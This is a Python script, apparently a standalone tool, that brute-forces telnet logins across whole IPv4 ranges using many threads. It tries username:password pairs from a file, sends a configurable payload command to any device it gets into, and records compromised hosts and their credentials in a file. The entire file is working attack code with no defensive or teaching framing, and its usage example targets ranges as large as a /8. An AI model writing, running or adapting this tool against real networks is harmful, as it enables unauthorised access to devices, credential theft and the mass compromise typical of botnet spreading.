import sys
import telnetlib
import ipaddress
import threading

payload = ""

def brute_force_telnet(ip, username_password_combinations, timeout):
  for username, password in username_password_combinations:
    try:
      telnet_client = telnetlib.Telnet(str(ip), timeout=timeout)
      telnet_client.read_until(b"login: ")
      telnet_client.write(username.encode('ascii') + b"\n")
      telnet_client.read_until(b"Password: ")
      telnet_client.write(password.encode('ascii') + b"\n")
      result = telnet_client.read_until(b"login: ", timeout=timeout)
      if b"Login incorrect" not in result:
        print(f"Successfully logged in to {ip} with username {username} and password {password}")
        telnet_client.write(payload.encode('ascii') + b"\n")
        result = telnet_client.read_until(b"login: ", timeout=timeout)
        #print(result.decode('ascii'))
        with open('valid_telnet.txt', "a") as f:
          f.write(f"{ip}:23 {username}:{password}\n")
        telnet_client.close()
        return True
    except Exception as e:
      #print(f"Failed to login to {ip} with username {username} and password {password}. Error: {e}")
      pass
  return False

def main(ip_range, username_password_combinations, timeout, max_threads):
  for ip in ip_range:
    t = threading.Thread(target=brute_force_telnet, args=(ip, username_password_combinations, timeout))
    while threading.active_count() > max_threads:
      pass
    t.start()
  sys.exit()

if __name__ == "__main__":
  if len(sys.argv) != 5:
    print("Usage: python telnet_bruteforcer.py <IP range> <username:password combinations file> <timeout> <max threads>")
    print("Example: python telnet_bruteforcer.py 192.168.178.0/24 | 192.168.0.0/16 | 192.0.0.0/8 combinations.txt 5 10")
    sys.exit()
  ip_range = ipaddress.IPv4Network(sys.argv[1])
  with open(sys.argv[2], "r") as f:
    username_password_combinations = [tuple(line.strip().split(":")) for line in f]
  timeout = int(sys.argv[3])
  max_threads = int(sys.argv[4])
  main(ip_range, username_password_combinations, timeout, max_threads)
